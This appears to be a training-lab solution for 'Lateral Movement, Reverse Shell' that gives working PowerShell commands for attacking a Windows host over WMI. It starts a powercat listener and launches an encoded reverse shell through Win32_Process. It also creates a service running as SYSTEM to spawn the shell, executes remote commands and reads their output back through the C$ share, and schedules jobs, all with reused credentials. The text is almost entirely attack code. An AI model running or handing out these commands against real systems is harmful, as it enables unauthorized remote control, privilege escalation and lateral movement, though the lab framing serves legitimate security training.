## Hands On 7 - Lateral Movement, Reverse Shell

Solution uses the following resources: 
- PowerShell reverse shell from PayloadOfAllThings: [Powershell Oneliner Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
- powercat as the listener: [powercat](https://github.com/besimorhino/powercat)

#### Get a reverse shell on WMI server using Win32_Process
Start the listner:

`powercat -l -v -p 4242 -t 1000`

Start the client up
```
$utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content '.\oneliner.txt'))
$base64string = [System.Convert]::ToBase64String($utfbytes)
Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList "powershell -e $base64string" -Credential $user3_creds -ComputerName Win7x64
```

#### Get a reverse shell on a WMI server using Win32_Service
Start the listner:

`powercat -l -v -p 4242 -t 1000`

Start the client up
```
$utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content '.\oneliner.txt'))
$base64string = [System.Convert]::ToBase64String($utfbytes)
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,"My Reverse Shell",$errorcontrol,$null,$null,"ReverseShell","C:\Windows\System32\cmd.exe /c powershell -e $base64string",$null,$servicetype ,"Manual","NT AUTHORITY\SYSTEM","" -ComputerName Win7x64 -Credential $user3_creds
Get-WmiObject -class Win32_Service -Filter 'Name = "ReverseShell"' -ComputerName Win7x64 -Credential $user3_creds
Get-WmiObject -class Win32_Service -Filter 'Name = "ReverseShell"' -ComputerName Win7x64 -Credential $user3_creds | Invoke-WmiMethod -Name StartService
```

#### Retrieve output of Win32_Process by writing the output to a text file on a target box
```
$command = "cmd.exe /c ipconfig /all > C:\Windows\Temp\output.txt"
$utfbytes  = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64string = [System.Convert]::ToBase64String($utfbytes)
Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList "powershell -e $base64string" -Credential $user3_creds -ComputerName Win7x64
```

Use the following to map a PowerShell drive to retrieve the contents of the commands
```
New-PSDrive -Name "PSDrive" -PSProvider "FileSystem" -Root "\\Win7x64\C$"  -Credential $user3_creds
Get-ChildItem -Path PSDrive:
Get-Content -Path PSDrive:\Windows\temp\output.txt
```

Remove the drive when finished

`Remove-PSDrive -Name PSDrive`

#### Use Win32_ScheduledJob for command execution on any computers
`Invoke-WmiMethod -Class Win32_Scheduledjob -Name Create -ArgumentList "cmd.exe /c dir c:\users > C:\Windows\Temp\output.txt",$null,$null,$false,$false,********152300.000000-300 -ComputerName Win7x64 -Credential $user3_creds`
